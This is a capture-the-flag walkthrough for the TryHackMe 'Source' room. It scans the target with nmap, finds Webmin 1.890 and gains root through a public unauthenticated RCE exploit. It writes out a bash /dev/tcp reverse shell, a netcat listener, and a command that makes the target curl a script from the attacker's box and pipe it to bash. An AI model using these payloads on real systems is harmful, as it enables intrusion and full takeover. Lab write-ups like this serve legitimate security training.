# Source-Write-UP-NO-Metasploit
Tryhackme Source CTF Walkthrough: https://tryhackme.com/room/source  

First, we start Nmap SCAN from Attack Machine  
**root@attack# nmap -sS -sC -sV -p- -oN nmapTCP.txt $IP -v**  

**==============================================================  
NMAP RESULTS**  
PORT      STATE SERVICE VERSION  
**22** /tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 b74cd0bde27b1b15722764562915ea23 (RSA)  
|   256 b78523114f44fa22008e40775ecf287c (ECDSA)  
|_  256 a9fe4b82bf893459365becdac2d395ce (ED25519)  
**10000**/tcp open  http    MiniServ 1.890 (Webmin httpd)  
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).  
|_http-favicon: Unknown favicon MD5: 7564A3DDF173FC8A1499DC41CE4CDD0A  
| http-methods:  
|_  Supported Methods: GET HEAD POST OPTIONS  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

**==============================================================  
Attack Vectors**  
**22**/SSH OpenSSH 7.6p1 Ubuntu →  

**10000**/HTTP MiniServ 1.890 (Webmin httpd) →  
**[*]** Checking for an exploit for webmin version → https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/blob/master/webmin-1.890_exploit.py

**Exploit Usage:**  
...  
WebMin 1.890-expired-remote-root  
Usage: python3 exploit.py HOST PORT COMMAND  
Ex: python3 exploit.py 10.0.0.1 10000 id  
...  

**[*]** Create a bash script (**shell.sh**) on attack box with a reverse shell inside    

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
#!/bin/bash  
bash -i >& /dev/tcp/<YOUR_ATTACK_BOX_IP>/1234 0>&1  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  

**[*]** Start a web server on attack box to host the script  

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
root@attack_box# python -m http.server  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  

**[*]** Start a listener on attack box with the same port defined in the reverse shell script  

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
root@attack_box# nc -nvlp 1234  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  

**[*]** Execute the following command toward target from attack machine  

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
root@attack_box# python3 webmin_1.890.py <TARGET_IP> 10000 'curl http://<YOUR_ATTACK_BOX_IP>:8000/shell.sh | bash'  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  

**[*]** Enjoy it!  
root@source:/usr/share/webmin/# whoami  
whoami  
root  
